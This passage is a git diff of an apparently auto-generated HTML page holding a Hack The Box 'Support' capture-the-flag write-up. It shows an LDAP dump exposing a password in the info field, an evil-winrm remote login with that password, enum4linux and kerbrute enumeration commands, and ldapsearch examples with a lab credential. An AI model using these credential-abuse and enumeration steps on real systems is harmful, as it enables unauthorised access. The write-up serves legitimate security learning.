+<span class="normal"><a href="#__codelineno-29-41">41</a></span>
+<span class="normal"><a href="#__codelineno-29-42">42</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1"></a># support, Users, support.htb
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2"></a>dn: CN=support,CN=Users,DC=support,DC=htb
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3"></a>objectClass: top
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4"></a>objectClass: person
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5"></a>objectClass: organizationalPerson
+</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6"></a>objectClass: user
+</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7"></a>cn: support
+</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8"></a>c: US
+</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9"></a>l: Chapel Hill
+</span><span id="__span-29-10"><a id="__codelineno-29-10" name="__codelineno-29-10"></a>st: NC
+</span><span id="__span-29-11"><a id="__codelineno-29-11" name="__codelineno-29-11"></a>postalCode: 27514
+</span><span id="__span-29-12"><a id="__codelineno-29-12" name="__codelineno-29-12"></a>distinguishedName: CN=support,CN=Users,DC=support,DC=htb
+</span><span id="__span-29-13"><a id="__codelineno-29-13" name="__codelineno-29-13"></a>instanceType: 4
+</span><span id="__span-29-14"><a id="__codelineno-29-14" name="__codelineno-29-14"></a>whenCreated: 20220528111200.0Z
+</span><span id="__span-29-15"><a id="__codelineno-29-15" name="__codelineno-29-15"></a>whenChanged: 20221109173336.0Z
+</span><span id="__span-29-16"><a id="__codelineno-29-16" name="__codelineno-29-16"></a>uSNCreated: 12617
+</span><span id="__span-29-17"><a id="__codelineno-29-17" name="__codelineno-29-17"></a>info: Ironside47pleasure40Watchful
+</span><span id="__span-29-18"><a id="__codelineno-29-18" name="__codelineno-29-18"></a>memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
+</span><span id="__span-29-19"><a id="__codelineno-29-19" name="__codelineno-29-19"></a>memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
+</span><span id="__span-29-20"><a id="__codelineno-29-20" name="__codelineno-29-20"></a>uSNChanged: 81981
+</span><span id="__span-29-21"><a id="__codelineno-29-21" name="__codelineno-29-21"></a>company: support
+</span><span id="__span-29-22"><a id="__codelineno-29-22" name="__codelineno-29-22"></a>streetAddress: Skipper Bowles Dr
+</span><span id="__span-29-23"><a id="__codelineno-29-23" name="__codelineno-29-23"></a>name: support
+</span><span id="__span-29-24"><a id="__codelineno-29-24" name="__codelineno-29-24"></a>objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
+</span><span id="__span-29-25"><a id="__codelineno-29-25" name="__codelineno-29-25"></a>userAccountControl: 66048
+</span><span id="__span-29-26"><a id="__codelineno-29-26" name="__codelineno-29-26"></a>badPwdCount: 0
+</span><span id="__span-29-27"><a id="__codelineno-29-27" name="__codelineno-29-27"></a>codePage: 0
+</span><span id="__span-29-28"><a id="__codelineno-29-28" name="__codelineno-29-28"></a>countryCode: 0
+</span><span id="__span-29-29"><a id="__codelineno-29-29" name="__codelineno-29-29"></a>badPasswordTime: 0
+</span><span id="__span-29-30"><a id="__codelineno-29-30" name="__codelineno-29-30"></a>lastLogoff: 0
+</span><span id="__span-29-31"><a id="__codelineno-29-31" name="__codelineno-29-31"></a>lastLogon: 0
+</span><span id="__span-29-32"><a id="__codelineno-29-32" name="__codelineno-29-32"></a>pwdLastSet: 132982099209777070
+</span><span id="__span-29-33"><a id="__codelineno-29-33" name="__codelineno-29-33"></a>primaryGroupID: 513
+</span><span id="__span-29-34"><a id="__codelineno-29-34" name="__codelineno-29-34"></a>objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
+</span><span id="__span-29-35"><a id="__codelineno-29-35" name="__codelineno-29-35"></a>accountExpires: 9223372036854775807
+</span><span id="__span-29-36"><a id="__codelineno-29-36" name="__codelineno-29-36"></a>logonCount: 0
+</span><span id="__span-29-37"><a id="__codelineno-29-37" name="__codelineno-29-37"></a>sAMAccountName: support
+</span><span id="__span-29-38"><a id="__codelineno-29-38" name="__codelineno-29-38"></a>sAMAccountType: 805306368
+</span><span id="__span-29-39"><a id="__codelineno-29-39" name="__codelineno-29-39"></a>objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
+</span><span id="__span-29-40"><a id="__codelineno-29-40" name="__codelineno-29-40"></a>dSCorePropagationData: 20220528111201.0Z
+</span><span id="__span-29-41"><a id="__codelineno-29-41" name="__codelineno-29-41"></a>dSCorePropagationData: 16010101000000.0Z
+</span><span id="__span-29-42"><a id="__codelineno-29-42" name="__codelineno-29-42"></a>lastLogonTimestamp: 133124888166969633
+</span></code></pre></div></td></tr></table></div>
 <p>There! Usually, the field "Info" is left empty but in this case, you can read: "Ironside47pleasure40Watchful", which might be a credential. Assuming that it is, we are going to enumerate user information in AD through the LDAP protocol. And for that, there exists a tool called evil-winrm.</p>
 <p><strong>What does evil-winrm do?</strong> evil-winrm is a WinRM shell for hacking/penthesting purposes.</p>
 <p><strong>And what is WinRM?</strong> WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators. <a href="https://github.com/Hackplayers/evil-winrm">Download evil-winrm repo here</a>.</p>
 <p>Run:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>dc.support.htb<span class="w"> </span>-u<span class="w"> </span>support<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;Ironside47pleasure40Watchful&quot;</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-30-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>dc.support.htb<span class="w"> </span>-u<span class="w"> </span>support<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;Ironside47pleasure40Watchful&quot;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>And we will connect to a powershell terminal: PS C:\Users\support\Documents</p>
 <p>To get the user.txt flag, run:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>cd ..
-</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>dir
-</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>cd Desktop
-</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>dir
-</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>type user.txt
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-31-1">1</a></span>
+<span class="normal"><a href="#__codelineno-31-2">2</a></span>
+<span class="normal"><a href="#__codelineno-31-3">3</a></span>
+<span class="normal"><a href="#__codelineno-31-4">4</a></span>
+<span class="normal"><a href="#__codelineno-31-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1"></a>cd ..
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2"></a>dir
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3"></a>cd Desktop
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4"></a>dir
+</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5"></a>type user.txt
+</span></code></pre></div></td></tr></table></div>
 <p>Result:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>561ec390613a0f53b431d3e14e923de6
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-32-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1"></a>561ec390613a0f53b431d3e14e923de6
+</span></code></pre></div></td></tr></table></div>
 <h2 id="getting-the-systems-flag">Getting the System's flag</h2>
 <p>Coming soon.</p>
 <h2 id="tools-in-this-lab">Tools in this lab</h2>
@@ -17561,35 +17788,47 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p><strong>kerbrute</strong></p>
 <p>Created by ropnop. <a href="https://github.com/ropnop/kerbrute">Download repo</a>. A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication.</p>
 <p>Nicely done in go, so to install it first you need to make sure that go is installed. Otherwise, run:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>sudo<span class="w"> </span>apt<span class="w"> </span>update<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>golang
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-33-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1"></a>sudo<span class="w"> </span>apt<span class="w"> </span>update<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>golang
+</span></code></pre></div></td></tr></table></div>
 <p>Then, follow the instructions from the repo.</p>
 <p><strong>enum4linux</strong></p>
 <p>Preinstalled in a kali machine. Tool to exploit null sessions by using some PERL scripts. Some cool commands here:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="c1"># enumerates shares</span>
-</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>enum4linux<span class="w"> </span>-S<span class="w"> </span><span class="nv">$ip</span>
-</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>
-</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a><span class="c1"># enumerates users</span>
-</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a>enum4linux<span class="w"> </span>-U<span class="w"> </span><span class="nv">$ip</span>
-</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a>enum4linux<span class="w"> </span>-M<span class="w"> </span><span class="nv">$ip</span><span class="w">     </span>//<span class="w"> </span>enumerates<span class="w"> </span>machine<span class="w"> </span>list
-</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a>enum4linux<span class="w"> </span>-enuP<span class="w"> </span><span class="nv">$ip</span><span class="w">   </span>//<span class="w"> </span>displays<span class="w"> </span>the<span class="w"> </span>password<span class="w"> </span>policy<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">case</span><span class="w"> </span>you<span class="w"> </span>need<span class="w"> </span>to<span class="w"> </span>mount<span class="w"> </span>a<span class="w"> </span>network<span class="w"> </span>authentification<span class="w"> </span>attack
-</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a>enum4linux<span class="w"> </span>-u<span class="w"> </span><span class="nv">$ip</span><span class="w">     </span>//<span class="w"> </span>specify<span class="w"> </span>username<span class="w"> </span>to<span class="w"> </span>use<span class="w"> </span><span class="o">(</span>default<span class="w"> </span>“”<span class="o">)</span>
-</span><span id="__span-34-9"><a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a>enum4linux<span class="w"> </span>-p<span class="w"> </span><span class="nv">$ip</span><span class="w">    </span>//<span class="w"> </span>specify<span class="w"> </span>password<span class="w"> </span>to<span class="w"> </span>use<span class="w"> </span><span class="o">(</span>default<span class="w"> </span>“”<span class="o">)</span>
-</span><span id="__span-34-10"><a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a>enum4linux<span class="w"> </span>-s<span class="w"> </span>/usr/share/enum4linux/share-list.txt<span class="w"> </span><span class="nv">$ip</span><span class="w">    </span>//<span class="w"> </span>Also<span class="w"> </span>you<span class="w"> </span>can<span class="w"> </span>use<span class="w"> </span>brute<span class="w"> </span>force<span class="w"> </span>by<span class="w"> </span>adding<span class="w"> </span>a<span class="w"> </span>file
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-34-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-34-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-34-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-34-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-34-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-34-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-34-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-34-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-34-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-34-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1"></a><span class="c1"># enumerates shares</span>
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2"></a>enum4linux<span class="w"> </span>-S<span class="w"> </span><span class="nv">$ip</span>
+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3"></a>
+</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4"></a><span class="c1"># enumerates users</span>
+</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5"></a>enum4linux<span class="w"> </span>-U<span class="w"> </span><span class="nv">$ip</span>
+</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6"></a>enum4linux<span class="w"> </span>-M<span class="w"> </span><span class="nv">$ip</span><span class="w">     </span>//<span class="w"> </span>enumerates<span class="w"> </span>machine<span class="w"> </span>list
+</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7"></a>enum4linux<span class="w"> </span>-enuP<span class="w"> </span><span class="nv">$ip</span><span class="w">   </span>//<span class="w"> </span>displays<span class="w"> </span>the<span class="w"> </span>password<span class="w"> </span>policy<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">case</span><span class="w"> </span>you<span class="w"> </span>need<span class="w"> </span>to<span class="w"> </span>mount<span class="w"> </span>a<span class="w"> </span>network<span class="w"> </span>authentification<span class="w"> </span>attack
+</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8"></a>enum4linux<span class="w"> </span>-u<span class="w"> </span><span class="nv">$ip</span><span class="w">     </span>//<span class="w"> </span>specify<span class="w"> </span>username<span class="w"> </span>to<span class="w"> </span>use<span class="w"> </span><span class="o">(</span>default<span class="w"> </span>“”<span class="o">)</span>
+</span><span id="__span-34-9"><a id="__codelineno-34-9" name="__codelineno-34-9"></a>enum4linux<span class="w"> </span>-p<span class="w"> </span><span class="nv">$ip</span><span class="w">    </span>//<span class="w"> </span>specify<span class="w"> </span>password<span class="w"> </span>to<span class="w"> </span>use<span class="w"> </span><span class="o">(</span>default<span class="w"> </span>“”<span class="o">)</span>
+</span><span id="__span-34-10"><a id="__codelineno-34-10" name="__codelineno-34-10"></a>enum4linux<span class="w"> </span>-s<span class="w"> </span>/usr/share/enum4linux/share-list.txt<span class="w"> </span><span class="nv">$ip</span><span class="w">    </span>//<span class="w"> </span>Also<span class="w"> </span>you<span class="w"> </span>can<span class="w"> </span>use<span class="w"> </span>brute<span class="w"> </span>force<span class="w"> </span>by<span class="w"> </span>adding<span class="w"> </span>a<span class="w"> </span>file
+</span></code></pre></div></td></tr></table></div>
 <p><strong>dnspy</strong></p>
 <p>Created by a bunch of contributors. <a href="https://github.com/dnSpy/dnSpy">Download the repo</a>.
 dnSpy is a debugger and .NET assembly editor. You can use it to edit and debug assemblies even if you don't have any source code available. There is a but: this tool is for windows</p>
 <p>To install, open powershell in windows and run:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>git clone --recursive https://github.com/dnSpy/dnSpy.git
-</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>cd dnsSpy
-</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>build.ps1 -NoMbuild
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-35-1">1</a></span>
+<span class="normal"><a href="#__codelineno-35-2">2</a></span>
+<span class="normal"><a href="#__codelineno-35-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1"></a>git clone --recursive https://github.com/dnSpy/dnSpy.git
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2"></a>cd dnsSpy
+</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3"></a>build.ps1 -NoMbuild
+</span></code></pre></div></td></tr></table></div>
 <p><strong>ILSpy</strong></p>
 <p>Open source alternative for dnspy. <a href="https://github.com/icsharpcode/ILSpy/">Download from repo; ILSpy</a>. To install ILSpy, you need to install some dependencies like: .NET 6.0 SDK, Avalonia, dotnet... Install what you are asked and when done, run:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="nb">cd</span><span class="w"> </span>~/tools/AvaloniaILSpy/artifacts/linux-x64
-</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>./ILSpy
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-36-1">1</a></span>
+<span class="normal"><a href="#__codelineno-36-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1"></a><span class="nb">cd</span><span class="w"> </span>~/tools/AvaloniaILSpy/artifacts/linux-x64
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2"></a>./ILSpy
+</span></code></pre></div></td></tr></table></div>
 <h2 id="what-i-learned">What I learned</h2>
 <p>When doing Support Machine I was faced with some challenging missions:</p>
 <p><strong>Enumerating shares as part of a Null session attack.</strong></p>
@@ -17605,15 +17844,15 @@ dnSpy is a debugger and .NET assembly editor. You can use it to edit and debug a
 <p>ldap-utils are preinstalled in kali, but before this lab, I didn't have had the chance to try them out.</p>
 <p><em>ldapsearch</em></p>
 <p>Syntax:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$ip</span><span class="w"> </span>-D<span class="w"> </span><span class="s1">&#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39;</span><span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;&lt;password&gt;&#39;</span><span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;&quot;</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-37-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$ip</span><span class="w"> </span>-D<span class="w"> </span><span class="s1">&#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39;</span><span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;&lt;password&gt;&#39;</span><span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;&quot;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>An example:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://dc.support.htb<span class="w"> </span>-D<span class="w"> </span><span class="s1">&#39;SUPPORT\ldap&#39;</span><span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#39;</span><span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;CN=Users,DC=SUPPORT,DC=HTB&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>ldap_dc.support.htb.txt
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-38-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://dc.support.htb<span class="w"> </span>-D<span class="w"> </span><span class="s1">&#39;SUPPORT\ldap&#39;</span><span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#39;</span><span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;CN=Users,DC=SUPPORT,DC=HTB&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>ldap_dc.support.htb.txt
+</span></code></pre></div></td></tr></table></div>
 <p><em>ldapdomaindump</em></p>
 <p>I have enjoyed this tool for real! It's pretty straightforward and you get legible results. An example of how to run it:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>ldapdomaindump<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;support\ldap&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#39;</span><span class="w"> </span>dc.support.htb
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-39-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1"></a>ldapdomaindump<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;support\ldap&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#39;</span><span class="w"> </span>dc.support.htb
+</span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
@@ -17689,7 +17928,7 @@ dnSpy is a debugger and .NET assembly editor. You can use it to edit and debug a
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
